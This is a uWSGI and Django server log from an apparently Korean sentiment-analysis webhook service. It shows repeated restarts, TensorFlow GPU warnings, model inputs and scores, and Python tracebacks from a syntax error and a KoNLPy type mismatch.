Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x560798ff1cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x560798ff1cf0 pid: 1777 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1777, cores: 1)
2020-08-28 12:01:57.158335: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:01:57.158371: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-08-28 12:02:05.490084: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:02:05.490114: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:02:05.490130: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:02:05.490346: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:02:05.515041: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:02:05.515401: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x56079df05e10 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:02:05.515420: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:02:05.806153: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:02:05.807774: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:02:05.809133: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['', '', '', '']
['', '', '']
[[2, 3141, 93]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    2
  3141   93]]
2020-08-28 12:02:10.071387: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-08-28 12:02:10.377758: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:02:10.379256: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:02:10.380671: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
91.92%   .

[pid: 1777|app: 0|req: 1/1] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:01:56 2020] POST /webhook/ => generated 38 bytes in 13790 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 1777|app: 0|req: 2/2] 193.118.53.194 () {36 vars in 501 bytes} [Fri Aug 28 12:03:43 2020] GET / => generated 1365 bytes in 23 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['', '', '', '']
['', '', '']
[[2, 3141, 93]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    2
  3141   93]]
91.92%   .

[pid: 1777|app: 0|req: 3/3] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:05:24 2020] POST /webhook/ => generated 38 bytes in 53 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '']
[[2, 3141, 93]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    2
  3141   93]]
91.92%   .

[pid: 1777|app: 0|req: 4/4] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:05:59 2020] POST /webhook/ => generated 38 bytes in 50 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '']
[[2, 3141, 93]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    2
  3141   93]]
91.92%   .

[pid: 1777|app: 0|req: 5/5] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:11:40 2020] POST /webhook/ => generated 38 bytes in 49 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:11:58 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5560b13e7cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5560b13e7cf0 pid: 1921 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1921, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 56
    }
    ^
SyntaxError: invalid syntax
[pid: 1921|app: 0|req: 1/1] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:12:05 2020] POST /webhook/ => generated 101847 bytes in 74 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
2020-08-28 12:14:27.383809: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:14:27.383846: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-08-28 12:14:33.879773: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:14:33.879805: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:14:33.879821: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:14:33.880034: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:14:33.907047: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:14:33.907443: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5560b6560260 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:14:33.907463: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:14:34.196175: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:14:34.197605: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:14:34.198997: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:14:40 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x555c65ac7cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x555c65ac7cf0 pid: 2008 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2008, cores: 1)
2020-08-28 12:14:47.816366: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:14:47.816399: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-08-28 12:14:54.228840: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:14:54.228871: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:14:54.228885: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:14:54.229094: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:14:54.255021: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:14:54.255397: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x555c6ac37770 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:14:54.255414: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:14:54.546265: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:14:54.547731: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:14:54.549112: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['', '', '', '']
['', '', '']
[[1, 3140, 92]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    1
  3140   92]]
2020-08-28 12:14:58.806710: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-08-28 12:14:59.117111: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:14:59.118597: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:14:59.120055: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
86.66%   .

[pid: 2008|app: 0|req: 1/1] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:14:47 2020] POST /webhook/ => generated 22 bytes in 11873 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '']
[[1, 3140, 92]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    1
  3140   92]]
86.66%   .

[pid: 2008|app: 0|req: 2/2] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:15:10 2020] POST /webhook/ => generated 22 bytes in 57 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:18:35 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x563c96493cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x563c96493cf0 pid: 2110 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2110, cores: 1)
2020-08-28 12:18:45.115587: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:18:45.115622: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-08-28 12:18:51.626091: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:18:51.626120: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:18:51.626135: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:18:51.626345: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:18:51.651046: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:18:51.651415: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x563c9b60be80 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:18:51.651431: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:18:51.942103: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:18:51.943576: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:18:51.944965: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 40, in webhook
    return welcome(params)
  File "./haniumapp/views.py", line 51, in welcome
    score,flag =  nlp.sentiment_predict(params)
  File "./haniumapp/nlp.py", line 71, in sentiment_predict
    new_sentence = okt.morphs(new_sentence, stem=True) # 
  File "/usr/local/lib/python3.6/dist-packages/konlpy/tag/_okt.py", line 78, in morphs
    return [s for s, t in self.pos(phrase, norm=norm, stem=stem)]
  File "/usr/local/lib/python3.6/dist-packages/konlpy/tag/_okt.py", line 63, in pos
    jpype.java.lang.Boolean(stem)).toArray()
TypeError: No matching overloads found for kr.lucypark.okt.OktInterface.tokenize(dict,java.lang.Boolean,java.lang.Boolean), options are:
	public java.util.List kr.lucypark.okt.OktInterface.tokenize(java.lang.String,java.lang.Boolean,java.lang.Boolean)


Fri Aug 28 12:18:52 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.249.84.13) !!!
Fri Aug 28 12:18:52 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.249.84.13)
OSError: write error
[pid: 2110|app: 0|req: 1/1] 66.249.84.13 () {42 vars in 540 bytes} [Fri Aug 28 12:18:44 2020] POST /webhook/ => generated 32612 bytes in 7565 msecs (HTTP/1.1 500) 5 headers in 156 bytes (0 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 40, in webhook
    return welcome(params)
  File "./haniumapp/views.py", line 51, in welcome
    score,flag =  nlp.sentiment_predict(params)
  File "./haniumapp/nlp.py", line 71, in sentiment_predict
    new_sentence = okt.morphs(new_sentence, stem=True) # 
  File "/usr/local/lib/python3.6/dist-packages/konlpy/tag/_okt.py", line 78, in morphs
    return [s for s, t in self.pos(phrase, norm=norm, stem=stem)]
  File "/usr/local/lib/python3.6/dist-packages/konlpy/tag/_okt.py", line 63, in pos
    jpype.java.lang.Boolean(stem)).toArray()
TypeError: No matching overloads found for kr.lucypark.okt.OktInterface.tokenize(dict,java.lang.Boolean,java.lang.Boolean), options are:
	public java.util.List kr.lucypark.okt.OktInterface.tokenize(java.lang.String,java.lang.Boolean,java.lang.Boolean)


[pid: 2110|app: 0|req: 2/2] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:21:02 2020] POST /webhook/ => generated 79944 bytes in 51 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:35:06 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x561579b89cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x561579b89cf0 pid: 2201 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2201, cores: 1)
2020-08-28 12:35:18.145426: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:35:18.145458: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-08-28 12:35:25.146940: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:35:25.146969: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:35:25.146986: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:35:25.147199: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:35:25.171026: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:35:25.171402: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x56157ecda490 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:35:25.171422: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:35:25.458711: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:35:25.460301: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
